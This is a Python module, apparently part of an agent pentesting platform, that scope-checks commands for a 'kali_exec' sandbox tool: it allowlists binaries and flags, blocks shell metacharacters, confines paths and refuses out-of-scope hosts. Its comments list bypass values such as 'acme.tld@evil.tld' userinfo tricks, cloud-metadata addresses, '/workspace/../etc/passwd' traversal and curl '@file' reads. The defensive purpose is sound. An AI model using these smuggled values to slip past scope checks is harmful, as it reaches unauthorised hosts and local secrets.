    r"^(?=.{1,253}$)(?!-)[A-Za-z0-9_-]{1,63}(?<!-)"
    r"(?:\.(?!-)[A-Za-z0-9_-]{1,63}(?<!-))*"
    r"\.[A-Za-z]{2,63}\.?$"
)


class CommandRefused(Exception):
    """A refusal whose message is WRITTEN for the caller to read and act on."""


@dataclass(frozen=True)
class KaliScope:
    """The project's authorised reach, resolved once by the caller."""
    domains: tuple[str, ...] = ()
    ips: tuple[str, ...] = ()
    ip_mode: bool = False
    roe_enabled: bool = False
    roe_excluded: tuple[str, ...] = ()
    # Scopes the writable workspace subtree. Empty means no workspace access.
    project_id: str = ""

    def is_configured(self) -> bool:
        return bool(self.domains or self.ips)


def _is_ip(value: str) -> bool:
    try:
        ipaddress.ip_address(value)
        return True
    except ValueError:
        return False


def _roe_excluded(host: str, scope: KaliScope) -> bool:
    """Mirrors recon/helpers/roe_scope.py `_is_roe_excluded` (exact, CIDR,
    subdomain suffix). Kept in step deliberately: an operator who excluded a host
    from scans would not expect an ad-hoc command to reach it."""
    if not scope.roe_enabled:
        return False
    for entry in scope.roe_excluded:
        entry = (entry or "").strip().lower()
        if not entry:
            continue
        if host == entry:
            return True
        if "/" in entry:
            try:
                network = ipaddress.ip_network(entry, strict=False)
                try:
                    if ipaddress.ip_address(host) in network:
                        return True
                except ValueError:
                    pass
            except ValueError:
                pass
        elif host.endswith("." + entry):
            return True
    return False


def _in_scope(host: str, scope: KaliScope) -> bool:
    if _is_ip(host):
        for entry in scope.ips:
            entry = (entry or "").strip()
            if not entry:
                continue
            if host == entry:
                return True
            if "/" in entry:
                try:
                    if ipaddress.ip_address(host) in ipaddress.ip_network(entry, strict=False):
                        return True
                except ValueError:
                    continue
        return False

    for domain in scope.domains:
        domain = (domain or "").strip().lower().rstrip(".")
        if not domain:
            continue
        # Label boundary: `notacme.tld` must not pass for scope `acme.tld`.
        if host == domain or host.endswith("." + domain):
            return True
    return False


def _resolve_host(value: str) -> str:
    """The host a HOST-typed value names, or raise.

    Unlike the first version this NEVER returns "no host here": a HOST slot that
    cannot be resolved to exactly one hostname is refused, because an unresolved
    value is an unchecked value.
    """
    raw = (value or "").strip()
    if not raw:
        raise CommandRefused("An empty value cannot be checked against the project's scope.")

    # `@server` is how dig, host and nslookup name a nameserver. It reaches the
    # generic userinfo check below and was refused there - correctly, but with a
    # message about URL userinfo that says nothing about what the caller
    # actually typed. A refusal an agent cannot act on gets retried blindly,
    # which is indistinguishable from probing.
    if raw.startswith("@"):
        raise CommandRefused(
            f"'{raw}' names an explicit nameserver. Querying a caller-chosen resolver is an "
            "out-of-band channel that never touches the scope-checked host, so it is refused. "
            "Drop it and the system resolver will be used."
        )

    if "://" in raw:
        parts = urlsplit(raw)
        scheme = (parts.scheme or "").lower()
        if scheme not in ALLOWED_URL_SCHEMES:
            raise CommandRefused(
                f"'{scheme}://' is not allowed: kali_exec accepts http and https URLs only."
            )
        if parts.username or parts.password or "@" in (parts.netloc or ""):
            # http://acme.tld@evil.tld/ reads as the in-scope host and connects
            # to the other one.
            raise CommandRefused(
                f"'{raw}' carries userinfo before the host, which hides the real destination."
            )
        host = parts.hostname
        if not host:
            raise CommandRefused(f"'{raw}' names no host.")
        return host.lower().rstrip(".")

    # Schemeless. Strip any path, query or fragment FIRST: `evil.tld/` and
    # `169.254.169.254/latest/meta-data/` are hosts with a path, and the first
    # version never split them off, so they were never checked.
    candidate = re.split(r"[/?#]", raw, 1)[0]
    if "@" in candidate:
        raise CommandRefused(
            f"'{raw}' carries userinfo before the host, which hides the real destination."
        )
    if candidate.startswith("["):
        # Bracketed IPv6.
        end = candidate.find("]")
        if end < 0:
            raise CommandRefused(f"'{raw}' is not a valid address.")
        inner = candidate[1:end]
        if not _is_ip(inner):
            raise CommandRefused(f"'{raw}' is not a valid address.")
        return inner.lower()
    if candidate.count(":") == 1:
        head, _, tail = candidate.partition(":")
        if not tail.isdigit():
            raise CommandRefused(
                f"'{raw}' is not a host this tool can check. Write it as a URL or host[:port]."
            )
        candidate = head
    elif candidate.count(":") > 1:
        # --resolve style host:port:addr triples, and bare IPv6.
        if _is_ip(candidate):
            return candidate.lower()
        raise CommandRefused(
            f"'{raw}' is not a host this tool can check. Write it as a URL or host[:port]."
        )

    candidate = candidate.lower().rstrip(".")
    if not candidate:
        raise CommandRefused(f"'{raw}' names no host.")
    if _is_ip(candidate):
        return candidate
    if _DOMAIN_RE.match(candidate):
        # ASCII only. A Cyrillic lookalike does not match, and is refused here
        # rather than passed through for curl to IDNA-encode into a real host.
        return candidate
    raise CommandRefused(
        f"'{raw}' is not a hostname, URL or IP address, so it cannot be checked "
        "against this project's scope."
    )


def _check_host(value: str, scope: KaliScope) -> str:
    host = _resolve_host(value)
    if _roe_excluded(host, scope):
        raise CommandRefused(
            f"'{host}' is on this project's Rules of Engagement excluded-hosts list."
        )
    if not _in_scope(host, scope):
        raise CommandRefused(
            f"'{host}' is outside this project's scope. kali_exec can only reach the target "
            "this project is configured for; it cannot be pointed somewhere else."
        )
    return host


def _check_path(value: str, scope: KaliScope) -> str:
    """An absolute, normalised path inside this project's writable roots."""
    raw = (value or "").strip()
    if raw in WRITABLE_EXACT:
        return raw
    if not raw.startswith("/"):
        # Relative paths resolve against the sandbox's cwd (/tmp), so `../etc/x`
        # escaped. Requiring absolute makes the check total.
        raise CommandRefused(
            f"'{raw}' must be an absolute path under {TMP_ROOT} or this project's "
            f"{WORKSPACE_ROOT}<projectId>/ directory."
        )
    # normpath collapses `..`, so /workspace/../etc/passwd becomes /etc/passwd
    # and fails the prefix test it used to pass.
    norm = posixpath.normpath(raw)
    if norm.startswith(TMP_ROOT):
        return norm
    if scope.project_id:
        own = f"{WORKSPACE_ROOT}{scope.project_id}/"
        if norm.startswith(own):
            return norm
    raise CommandRefused(
        f"'{raw}' points outside {TMP_ROOT} and this project's "
        f"{WORKSPACE_ROOT}{scope.project_id or '<projectId>'}/ directory. "
        "The workspace is shared between projects, so only your own subtree is writable."
    )


def _check_opaque(value: str) -> str:
    """Free text that must not smuggle a destination or a file reference."""
    raw = value or ""
    if "://" in raw:
        raise CommandRefused(
            f"'{raw}' looks like a URL in a slot that is not a target. Pass the target separately."
        )
    if raw.startswith("@"):
        # curl reads @file for -d, -b and -w.
        raise CommandRefused(
            f"'{raw}' starts with '@', which makes the tool read a local file."
        )
    if raw.startswith("/"):
        raise CommandRefused(
            f"'{raw}' looks like a path in a slot that is not a file argument."
        )
    return raw


def _check_text(value: str) -> str:
    """A header, body or user-agent: a URL here is DATA, not a destination.

    Still refuses `@file`, which every one of these slots reads from disk."""
    raw = value or ""
    if raw.startswith("@"):
        raise CommandRefused(
            f"'{raw}' starts with '@', which makes the tool read a local file."
        )
    return raw


def _split_bools(token: str, spec: BinarySpec) -> list[str] | None:
    """Decompose `-sI` into `-s -I`, but only when EVERY letter is a known
    boolean flag of this binary.

    This is what refuses an attached short value: `-xevil.tld` decomposes to
    letters that are not boolean flags, so it is rejected rather than treated as
    a flag with its value glued on, which the first version skipped entirely.
    """
    if not (len(token) > 2 and token.startswith("-") and not token.startswith("--")):
        return None
    parts = [f"-{ch}" for ch in token[1:]]
    if all(spec.flags.get(p) == BOOL for p in parts):
        return parts
    return None


def admit(command: str, scope: KaliScope) -> list[str]:
    """Return the argv to run, or raise CommandRefused saying exactly why."""
    if not isinstance(command, str) or not command.strip():
        raise CommandRefused("A command is required.")
    if len(command) > MAX_COMMAND_CHARS:
        raise CommandRefused(f"The command is longer than {MAX_COMMAND_CHARS} characters.")

    bad = sorted(_METACHARACTERS.intersection(command))
    if bad:
        raise CommandRefused(
            f"Shell metacharacters are not allowed: {' '.join(repr(c) for c in bad)}. "
            "kali_exec runs one program with arguments; it is not a shell, so pipelines, "
            "redirection, substitution and chained commands are refused."
        )

    try:
        argv = shlex.split(command)
    except ValueError as exc:
        raise CommandRefused(f"The command could not be parsed: {exc}.") from exc
    if not argv:
        raise CommandRefused("A command is required.")
    if len(argv) > MAX_ARGS:
        raise CommandRefused(f"The command has more than {MAX_ARGS} arguments.")

    program = argv[0]
    if "/" in program:
        raise CommandRefused(f"'{program}' must be a bare program name, not a path.")
    spec = SPECS.get(program)
    if spec is None:
        raise CommandRefused(
            f"'{program}' is not available to kali_exec. Allowed: "
            f"{', '.join(sorted(ALLOWED_BINARIES))}. This is a fixed allowlist of read-only "
            "tools; tools whose flags can load or run code are excluded on purpose. Call "
            "kali_toolbox to see the full sandbox toolset."
        )

    if not scope.is_configured():
        raise CommandRefused(
            "This project has no target domain or IPs configured, so no command can be "
            "scope-checked. Configure the target first."
        )

    out: list[str] = [program]
    named_hosts: list[str] = []
    positionals = 0
    pending: tuple[str, str] | None = None   # (flag, kind) awaiting its value

    for token in argv[1:]:
        if pending is not None:
            flag, kind = pending
            pending = None
            out.append(_consume(flag, kind, token, scope, named_hosts, spec))
            continue

        looks_like_flag = token.startswith("-") or token.startswith("+")
        if looks_like_flag:
            name, sep, inline = token.partition("=")
            if name in spec.denied:
                raise CommandRefused(
                    f"'{name}' is not allowed with {program}: {spec.denied[name]}."
                )
            kind = spec.flags.get(name)
            if kind is None:
                decomposed = _split_bools(token, spec)
                if decomposed is not None:
                    out.extend(decomposed)
                    continue
                raise CommandRefused(
                    f"'{name}' is not an allowed option for {program}. Allowed: "
                    f"{', '.join(sorted(spec.flags))}. Options are allowlisted per tool, and "
                    "a value must be written as a separate argument or with '=', never "
                    "attached to a short option."
                )
            if kind == BOOL:
                if sep:
                    raise CommandRefused(f"'{name}' takes no value.")
                out.append(name)
                continue
            if sep:
                out.append(name)
                out.append(_consume(name, kind, inline, scope, named_hosts, spec))
            else:
                out.append(name)
                pending = (name, kind)
            continue

        positionals += 1
        kind = spec.positional if positionals == 1 else (spec.positional_rest or spec.positional)
        if positionals > spec.max_positional:
            raise CommandRefused(
                f"{program} accepts at most {spec.max_positional} positional argument(s); "
                f"'{token}' is extra. Every argument has to be checkable, so a spare one is refused."
            )
        out.append(_consume("<argument>", kind, token, scope, named_hosts, spec))

    if pending is not None:
        raise CommandRefused(f"'{pending[0]}' is missing its value.")

    if spec.network and not named_hosts:
        raise CommandRefused(
            f"'{program}' reaches the network, so it must name its target explicitly. "
            "A command whose target is implied cannot be scope-checked."
        )

    out.extend(spec.inject)
    return out


def _consume(
    flag: str, kind: str, value: str, scope: KaliScope,
    named_hosts: list[str], spec: BinarySpec,
) -> str:
    if kind == HOST:
        named_hosts.append(_check_host(value, scope))
        return value
    if kind == PATH:
        return _check_path(value, scope)
    if kind == RRTYPE:
        if value.lower() not in DNS_RECORD_TYPES:
            raise CommandRefused(
                f"'{value}' is not a DNS record type. Allowed: "
                f"{', '.join(sorted(t.upper() for t in DNS_RECORD_TYPES))}."
            )
        return value
    if kind == CHOICE:
        if value not in spec.choices:
            raise CommandRefused(
                f"'{value}' is not an allowed sub-command here. Allowed: "
                f"{', '.join(sorted(spec.choices))}."
            )
        return value
    if kind == TEXT:
        return _check_text(value)
    if kind == OPAQUE:
        return _check_opaque(value)
    raise CommandRefused(f"'{flag}' has an unknown value kind.")


def to_shell_command(argv: list[str]) -> str:
    """Quote the admitted argv for transport through `kali_shell`'s `bash -c`.

    `shlex.join` quotes EVERY argument, so each one arrives at the program as a
    single literal token. This, not the metacharacter check, is what makes the
    transport safe.
    """
    return shlex.join(argv)
